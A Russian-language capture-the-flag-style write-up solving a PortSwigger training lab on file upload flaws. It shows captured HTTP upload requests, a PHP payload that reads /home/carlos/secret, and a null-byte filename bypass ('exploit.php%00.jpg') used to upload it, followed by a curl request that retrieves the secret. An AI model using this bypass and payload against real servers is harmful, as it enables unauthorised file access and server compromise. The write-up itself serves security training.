---
title: "Web shell upload via obfuscated file extension"
date: 2025-08-14
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/insufficient-blacklisting-of-dangerous-file-types/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension"
classes: wide
---

В данной лабе содержится уязвимость **в загрузке файлов**. Для прохождения нужно получить доступ к файлу `/home/carlos/secret` и передать его содержимое в форму проверки.

Для входа в аккаунт можно использовать данные `wiener`:`peter`.

```
https://0a9e00500358597d8139cfb30072000e.web-security-academy.net/
```

## Solution

Залогинюсь в ЛК, чтобы получить доступ к загрузке изображения. Далее загружу картинку, чтобы получить `POST`-запрос:

```http
POST /my-account/avatar HTTP/2
Host: 0a9e00500358597d8139cfb30072000e.web-security-academy.net
Cookie: session=lEfYg1FlPTuq1ROth2VpoLZNtUwnBfjp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9e00500358597d8139cfb30072000e.web-security-academy.net/my-account?id=wiener
Content-Type: multipart/form-data; boundary=----geckoformboundaryfceb9abf78dbacfa1630c433a9ee5183
Content-Length: 107749
Origin: https://0a9e00500358597d8139cfb30072000e.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundaryfceb9abf78dbacfa1630c433a9ee5183
Content-Disposition: form-data; name="avatar"; filename="dog.jpg"
Content-Type: image/jpeg
```

Получил ответ:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_obfuscated_file_extension/1.png){: height="200" .align-center}

Попробую загрузить пейлоад на `php` со следующим содержанием:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Я получил следующее сообщение об ошибке:

```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```

Перехвачу этот запрос с помощью `Burp Proxy`.

```http
POST /my-account/avatar HTTP/2
Host: 0a9e00500358597d8139cfb30072000e.web-security-academy.net
Cookie: session=lEfYg1FlPTuq1ROth2VpoLZNtUwnBfjp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9e00500358597d8139cfb30072000e.web-security-academy.net/my-account
Content-Type: multipart/form-data; boundary=----geckoformboundary2c70b7ac2112b49187d963d4f8123642
Content-Length: 521
Origin: https://0a9e00500358597d8139cfb30072000e.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundary2c70b7ac2112b49187d963d4f8123642
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>

------geckoformboundary2c70b7ac2112b49187d963d4f8123642
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary2c70b7ac2112b49187d963d4f8123642
Content-Disposition: form-data; name="csrf"

RgCgfWH2Gi2LyeTUGt2VfUTMRoERK3OT
------geckoformboundary2c70b7ac2112b49187d963d4f8123642--
```

Попробую обфусцировать расширение файла.

```
exploit.php .jpg - Ok, но нет доступа
'exploit.php ' - 403
exploit.php%00.jpg - ok
```

Теперь надо получить файл через `curl`:

```bash
cu63:~/ $ curl https://0a9e00500358597d8139cfb30072000e.web-security-academy.net/files/avatars/exploit.php                                               
muIWVFAUZpHDz4wxvhmVaTIRTvphcvCO%
```

Сдам токен `muIWVFAUZpHDz4wxvhmVaTIRTvphcvCO` для прохождения лабы в форму проверки.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_obfuscated_file_extension/2.png){: height="200" .align-center}

Лаба успешно пройдена:3